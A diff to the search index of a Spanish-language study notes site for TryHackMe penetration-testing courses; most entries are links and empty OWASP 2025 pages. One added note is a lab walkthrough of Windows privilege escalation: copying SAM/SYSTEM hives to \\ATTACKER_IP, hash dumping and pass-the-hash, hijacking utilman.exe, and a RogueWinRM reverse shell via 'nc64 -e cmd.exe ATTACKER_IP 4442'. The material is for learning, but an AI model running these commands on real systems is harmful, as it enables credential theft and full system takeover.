@@ -4276,8 +4276,8 @@
     "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-penetration-tester/",
     "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Penetration Tester.md",
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester",
-    "content": "[[1. Jr Penetration Tester]]\n[[2. Web Fundamentals]]",
-    "modified": "2025-11-22T00:47:14"
+    "content": "[[1. Jr Penetration Tester]]\n[[2. Web Fundamentals]]\n[[3. Web Application Pentesting]]",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "1. Security Analyst",
@@ -4292,8 +4292,8 @@
     "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/2-web-fundamentals/",
     "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Web Fundamentals.md",
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals",
-    "content": "",
-    "modified": "2025-11-22T00:47:14"
+    "content": "[[1. How The Web Works]]\n[[2. Introduction to Web Hacking]]\n[[3. Burp Suite]]\n[[4. Web Hacking Fundamentals]]\n[[5. OWASP Top 10 - 2025]]",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "1. Jr Penetration Tester",
@@ -4302,6 +4302,14 @@
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester",
     "content": "[[1. Introduction to Cyber Security]]\n[[2. Introduction to Pentesting]]\n[[3. Introduction to Web Hacking]]\n[[4. Burp Suite]]\n[[5. Network Security]]\n[[6. Vulnerability Research]]\n[[7. Metasploit]]\n[[8. Privilege Escalation]]",
     "modified": "2025-11-22T00:47:14"
+  },
+  {
+    "title": "3. Web Application Pentesting",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-web-application-pentesting/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Web Application Pentesting.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting",
+    "content": "[[1. Authentication]]",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "2. Introduction to Web Hacking",
@@ -4334,6 +4342,14 @@
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite",
     "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/1. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/3. Burp Suite - Intruder/0. Burp Suite - Intruder]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/4. Burp Suite - Other Modules/0. Burp Suite - Other Modules]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/5. Burp Suite - Extensions/0. Burp Suite - Extensions]]",
     "modified": "2025-11-22T00:47:14"
+  },
+  {
+    "title": "5. OWASP Top 10 - 2025",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/5-owasp-top-10-2025/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/5. OWASP Top 10 - 2025.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025",
+    "content": "1. [[0. OWASP Top 10 2025 - IAAA Failures]]\n2. [[0. OWASP Top 10 2025 - Application Design Flaws]]\n3. [[0. OWASP Top 10 2025 - Insecure Data Handling]]",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "1. Redireccion",
@@ -4758,6 +4774,118 @@
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 1. Burp Suite - The Basics",
     "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 8. Web Hacking -> 4. Burp Suite - The Basics**",
     "modified": "2025-11-22T00:47:14"
+  },
+  {
+    "title": "2. A01 - Broken Access Control",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/2-a01-broken-access-control/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/2. A01 - Broken Access Control.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "0. OWASP Top 10 2025 - IAAA Failures",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/0-owasp-top-10-2025-iaaa-failures/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/0. OWASP Top 10 2025 - IAAA Failures.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
+    "content": "[[1. What is IAAA]]\n[[2. A01 - Broken Access Control]]\n[[3. A07 - Authentification Failures]]\n[[4. A09 - Logging & Alerting Features]]",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "1. What is IAAA",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/1-what-is-iaaa/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/1. What is IAAA.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "3. A07 - Authentification Failures",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/3-a07-authentification-failures/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/3. A07 - Authentification Failures.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "4. A09 - Logging & Alerting Features",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/4-a09-logging-alerting-features/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/4. A09 - Logging & Alerting Features.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "3. AS04 - Cryptographic Failures",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/3-as04-cryptographic-failures/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/3. AS04 - Cryptographic Failures.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "4. AS06 - Insecure Design",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/4-as06-insecure-design/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/4. AS06 - Insecure Design.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "0. OWASP Top 10 2025 - Application Design Flaws",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/0-owasp-top-10-2025-application-design-flaws/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/0. OWASP Top 10 2025 - Application Design Flaws.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
+    "content": "[[1. AS02 - Security Missconfigurations]]\n[[2. AS03 - Software Supply Chain Failures]]\n[[3. AS04 - Cryptographic Failures]]\n[[4. AS06 - Insecure Design]]",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "1. AS02 - Security Missconfigurations",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/1-as02-security-missconfigurations/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/1. AS02 - Security Missconfigurations.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "2. AS03 - Software Supply Chain Failures",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/2-as03-software-supply-chain-failures/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/2. AS03 - Software Supply Chain Failures.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "3. A08 - Software or Data Integrity Failures",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/3-a08-software-or-data-integrity-failures/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/3. A08 - Software or Data Integrity Failures.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "2. A05 - Injection",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/2-a05-injection/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/2. A05 - Injection.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "0. OWASP Top 10 2025 - Insecure Data Handling",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/0-owasp-top-10-2025-insecure-data-handling/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/0. OWASP Top 10 2025 - Insecure Data Handling.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
+    "content": "[[1. A04 - Cryptographic Failures]]\n[[2. A05 - Injection]]\n[[3. A08 - Software or Data Integrity Failures]]",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "1. A04 - Cryptographic Failures",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/1-a04-cryptographic-failures/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/1. A04 - Cryptographic Failures.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "3. Introduction to Web Hacking",
@@ -6100,16 +6228,16 @@
     "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/0-windows-privilege-escalation/",
     "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/0. Windows Privilege Escalation.md",
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
-    "content": "[[1. Windows Privilege Escalation]]\n[[2. Harvesting Passwords from Usual Spots]]\n[[3. Other Quick Wins]]\n[[4. Abusing Service Misconfigurations]]\n[[5. Abusing Dangerous Privileges]]\n[[6. Abusing Vulnerable Software]]\n[[7. Tools of the Trade]]",
-    "modified": "2025-11-22T00:47:14"
+    "content": "[[1. Windows Privilege Escalation]]\n[[2. Harvesting Passwords from Usual Spots]]\n[[3. Other Quick Wins]]\n[[4. Abusing Service Misconfigurations]]\n[[5. Abusing Dangerous Privileges]]\n[[6. Abusing Vulnerable Software]]\n[[7. Tools of the Trade]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/8. Conclusion]]",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "5. Abusing Dangerous Privileges",
     "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/5-abusing-dangerous-privileges/",
     "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/5. Abusing Dangerous Privileges.md",
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
-    "content": "",
-    "modified": "2025-11-22T00:47:14"
+    "content": "<h2>Windows Privileges</h2>\nLos privilegios son los \"derechos\" que una cuenta tiene sobre un archivo, directorio o tarea en un sistema.\n\nCada usuario tiene un conjunto asignado de privilegios que pueden comprobarse con el comando `whoami /priv`.\n\nUna lista completa de privilegios Windows está disponible [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Desde el punto de vista de un atacante, sólo los privilegios que nos permiten escalar en el sistema son interesantes. En el repositorio [Priv2Admin](https://github.com/gtworek/Priv2Admin) tienes una lista de privilegios explotables en Windows.\n\n----------------------------------------\n<h2>SeBacckup / SeRestore</h2>\nLos privilegios SeBackup y SeRestore permiten a los usuarios leer y escribir cualquier archivo en el sistema ignorando cualquier DACL. La idea de estos privilegios es permitir a ciertos usuarios realizar backups de un sistema sin requerir permisos completos de administrador.\n\nCon este poder en mano, un atacante puede escalar sus privilegios usando varias técnicas. La que veremos consiste en copiar los registros SAM Y SYSTEM para extraer el hash de la contraseña del administrador local.\n\nUsaremos las credenciales dadas para acceder a la máquina.\n\nAhora, debemos ejecutar un cmd como administrador, desde la cuenta dada.\n\n![[Pasted image 20251130141911.png]]\n\nUna vez se abra, podemos comprobar nuestros privilegios con el siguiente comando:\n\n```cmd\nC:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeBackupPrivilege             Back up files and directories  Disabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nPara hacer un backup de los hashes de SAM y SYSTEM, podemos usar los siguientes comandos:\n\n```cmd\nC:\\> reg save hklm\\system C:\\Users\\THMBackup\\system.hive\nThe operation completed successfully.\n\nC:\\> reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive\nThe operation completed successfully.\n```\n\nEsto creará un par de archivos con los contenidos del registro. Ahora podemos copiar estos archivos a nuestra máquina atacante usando SMB o cualquier otro método disponible. Para SMB, podemos usar `smbserver.py` para arrancar un servidor SMB con una compartición de red en el directorio actual.\n\n```bash\nuser@attackerpc$ mkdir share\nuser@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share\n```\n\nEsto creará una compartición llamada `public` que apunte al directorio `share` que requiere usuario y contraseña. Después, podemos usar el comando `copy` en la máquina Windows para transferir ambos archivos a la máquina atacante.\n\n```cmd\nC:\\> copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\\nC:\\> copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\\n```\n\nY usamos el \"impacket\" para recuperar los hashes:\n\n```bash\nuser@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nAhora podemos usar el hash del Administrator para realizar un ataque Pass-the-Hash y ganar acceso al sistema con privilegios SYSTEM:\n\n```bash\nuser@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.82.139.97\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.175.90.....\n[*] Found writable share ADMIN$\n[*] Uploading file nfhtabqO.exe\n[*] Opening SVCManager on 10.10.175.90.....\n[*] Creating service RoLE on 10.10.175.90.....\n[*] Starting service RoLE.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n```\n\n-------------------------------------\n<h2>SeTakeOwnership</h2>\nEl privilegio SeTakeOwnership permite a un usuario tomar posesión de cualquier objeto del sistema incluyendo archivos y claves de registro, abriendo muchas posibilidades para que un atacante eleve sus privilegios ya que podríamos, por ejemplo, buscar un servicio que corra como SYSTEM y tomar posesión de su ejecutable.\n\nUsaremos las credenciales dadas para iniciar sesión en la máquina.\n\nEjecutamos la cmd como administrador e introducimos las credenciales dadas.\n\nUna vez dentro, podemos comprobar nuestros privilegios con `whoami /priv`:\n\n```cmd\nC:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                              State\n============================= ======================================== ========\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Disabled\n```\n\nAbusaremos `utilman.exe` para escalar privilegios esta vez. Esta es una aplicación integrada en Windows para ofrecer facilidad de acceso en la pantalla de bloqueo.\n\n![[Pasted image 20251130153711.png]]\n\nYa que Utilman corre con privilegios SYSTEM, ganaremos esos privilegios si reemplazamos el binario original por un payload nuestro. Como podemos tomar posesión de cualquier archivo, reemplazarlo es trivial.\n\nEmpezamos tomando posesión del binario.\n\n```cmd\nC:\\> takeown /f C:\\Windows\\System32\\Utilman.exe\n\nSUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\".\n```\n\n>[!NOTE] Ser el propietario de un archivo no implica que tengas privilegios sobre él. Pero siéndolo, puedes darte cualquier privilegio que quieras.\n\n```cmd\nC:\\> icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F\nprocessed file: Utilman.exe\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\nDespués de esto, cambiamos `utilman.exe` por una copia de `cmd.exe`.\n\n```cmd\nC:\\Windows\\System32\\> copy cmd.exe utilman.exe\n        1 file(s) copied.\n```\n\nPara disparar utilman, bloquearemos nuestra pantalla desde el botón de windows \"**Lock**\".\n\n![[Pasted image 20251130155554.png]]\n\nY por último le damos a \"Ease of Access\", que ejecutará `utilman.exe` con privilegios SYSTEM.\n\n![[Pasted image 20251130155641.png]]\n\n------------------------------\n<h2>SeImpersonate / SeAssignPrimaryToken</h2>\nEstos privilegios le permiten a in proceso hacerse pasar por otros usuarios y actuar en su nombre. Esto es fácil de entender cuando pensamos en cómo funciona un servidor FTP. Este debe restringir a los usuarios para que sólo puedan acceder a sus contenidos.\n\nAsumamos que tenemos un servidor FTP corriendo con el usuario `ftp`. Sin impersonation, si el usuario Ann inicia sesión e intenta acceder a los archivos, el servicio FTP trataría de acceder a ellos con su token de acceso en lugar del de Ann.\n\n![[Pasted image 20251130164033.png]]\n\nHay varias razones por las que usar el token de ftp no es buena idea:\n\n- Para que los archivos se sirvan correctamente, necesitarían ser accesibles al usuario `ftp`. En el ejemplo de arriba, el DACL de los archivos de Bill no permite a \"ftp\" acceder a ellos. Esto requiere configuración extra y añade complejidad.\n- Para el sistema operativo, todos los archivos son accedidos por \"ftp\", sin importar el usuario actual. Esto hace imposible delegar la autorización al sistema operativo por lo que FTP debe implementarla.\n- Si el servicio FTP es comprometido, el atacante gana acceso inmediatamente a todos los archivos a los que tenga acceso \"ftp\".\n\nSi, por otro lado, el usuario \"ftp\" tiene el privilegio SeImpersonate o SeAssignPrimaryToken, todo esto se simplifica ya que el servicio FTP puede tomar temporalmente el token del usuario que accede y usarlo para realizar cualquier tarea en su nombre.\n\n![[Pasted image 20251130164854.png]]\n\nAhora, si el usuario Ann inicia sesión en el servicio FTP, y dado que el usuario ftp tiene privilegios de impersonation, puede tomar prestado el token de Ann y usarlo para acceder a sus archivos. De esta manera, no necesitamos dar permisos de acceso al usuario ftp. Mientras el servidor se hace pasar por Ann, no podrá acceder a archivos de ningún otro usuario para los que Ann no tenga permisos.\n\nComo atacantes, si conseguimos tomar control de un proceso con SeImpersonate o SeAssignPrimaryToken, podemos hacernos pasar por cualquier usuario que se conecte y autentifique.\n\nEn los sistemas Windows, los usuarios LOCAL SERVICE y NETWORK SERVICE ACCOUNTS ya tienen dichos privilegios. IIS también creará una cuenta similar llamada \"iisapppool\\defaultapppool\" para aplicaciones web.\n\nPara elevar privilegios usando dichas cuentas, un atacante necesita hacer lo siguiente:\n\n1. Spawnear un proceso para que los usuarios puedan conectarse y autentificarse.\n2. Encontrar una manera de forzar que los usuarios privilegiados se conecten y autentifiquen.\n\nUsaremos el exploit RogueWinRM para conseguir ambas condiciones.\n\nEmpecemos asumiendo que ya hemos comprometido una página corriendo en un IIS y que hemos plantado una webshell en la siguiente dirección:  `http://<ip>`\n\nPodemos usar la webshell para comprobar si tenemos privilegios en la cuenta comprometida y confirmar que tenemos ambos privilegios:\n\n![[Pasted image 20251130171345.png]]\n\nPara usar RogueWinRM, necesitamos subir el exploit a la máquina víctima.\n\nEste exploit es posible porque siempre que un usuario (incluyendo los no privilegiados) arrancan el servicio BITS en Windows, automáticamente crea una conexión al puerto 5985 usando privilegios de SYSTEM. Este puerto se usa típicamente para el servicio WinRM, que es un puerto que expone una powershell para ser usada de forma remota. Es como SSH pero usando powershell.\n\nSi por alguna razón el servicio WinRM no está corriendo en el servidor objetivo, un atacante podría arrancar un servicio WinRM falso en dicho puerto y capturar el intento de autentificación hecho por el servicio BITS al empezar. Si el atacante tiene privilegios SeImpersonate puede ejecutar cualquier comando en nombre del usuario que ese conecte, que es SYSTEM.\n\nAntes de ejecutar el exploit, arrancamos un listener en nuestra máquina con `nc -lvp 4442`.\n\nY luego usamos nuestra propia webshell para usar el exploit con el siguiente comando.\n\n`c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\"`\n\n![[Pasted image 20251130192516.png]]\n\n>[!IMPORTANT] El exploit puede tardar hasta 2 minutos en funcionar, ten paciencia.\n\n- `-p`: Especifica el ejecutable a ejecutar por el exploit.\n- `-a`: Se usa para pasar argumentos al ejecutable.\n\nSi lo hicimos bien, recibiremos la consola.",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "3. Other Quick Wins",
@@ -6120,12 +6248,20 @@
     "modified": "2025-11-29T00:48:12"
   },
   {
+    "title": "8. Conclusion",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/8-conclusion/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/8. Conclusion.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
+    "content": "Si estás interesado en aprender más técnicas puedes visitar los siguientes enlaces:\n\n- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\n- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)\n- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)\n- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)\n- [Decoder's Blog](https://decoder.cloud/)\n- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)\n- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
     "title": "7. Tools of the Trade",
     "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/7-tools-of-the-trade/",
     "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/7. Tools of the Trade.md",
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
-    "content": "",
